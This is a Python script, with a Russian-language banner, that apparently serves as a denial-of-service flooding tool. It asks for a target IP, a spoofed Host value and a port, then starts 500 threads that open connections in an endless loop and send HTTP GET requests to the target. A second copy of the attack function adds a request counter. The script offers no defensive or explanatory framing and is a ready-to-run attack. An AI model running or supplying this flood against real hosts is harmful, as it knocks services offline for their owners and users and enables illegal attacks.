import sys
import os
import time
import socket
import random
from colorama import Fore, Back, Style
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
# Import modules
import os
import sys
import argparse
from colorama import Fore
import threading
import random
import time
import socket
import sys
import requests 
import socks
import random
import socket
import threading
import time
import os,sys
import ssl
os.system("clear")
method = "HTTP"
print("""\033[31m
      ░░░░░░░░░░▀▀▀██████▄▄▄░░░░░░░░░░
      ░░░░░░░░░░░░░░░░░▀▀▀████▄░░░░░░░
      ░░░░░░░░░░▄███████▀░░░▀███▄░░░░░
      ░░░░░░░░▄███████▀░░░░░░░▀███▄░░░
      ░░░░░░▄████████░░░░░░░░░░░███▄░░
      ░░░░░██████████▄░░░░░░░░░░░███▌░
      ░░░░░▀█████▀░▀███▄░░░░░░░░░▐███░
      ░░░░░░░▀█▀░░░░░▀███▄░░░░░░░▐███░
      ░░░░░░░░░░░░░░░░░▀███▄░░░░░███▌░
      ░░░░▄██▄░░░░░░░░░░░▀███▄░░▐███░░
      ░░▄██████▄░░░░░░░░░░░▀███▄███░░░
      ░█████▀▀████▄▄░░░░░░░░▄█████░░░░
      ░████▀░░░▀▀█████▄▄▄▄█████████▄░░
      ░░▀▀░░░░░░░░░▀▀██████▀▀░░░▀▀██░░ 
        
           \033[36mРазнеси всех и вся 💥
""")
time.sleep(2)


import socket
import threading
import os
import time


print ("")
print("\033[31m ╔═══\033[33m[ Ваша Цель [IP] ] •")
target = input("\033[31m ┗━━━━━━\033[92m•> \033[0m")
print("Target = ", target)
time.sleep(0.5)
print("\033[31m ╔═══\033[33m[ Fake IP ] •")
fake_ip = input("\033[31m ┗━━━━━━\033[92m•> \033[0m")
time.sleep(0.5)
print("\033[31m ╔═══\033[33m[ PORT ] •")
port = input("\033[31m ┗━━━━━━\033[92m•> \033[0m")
port_a = int(port)
print ("\033[36m")

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port_a))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port_a))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port_a))
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    
    
attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port_a))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port_a))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port_a))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()
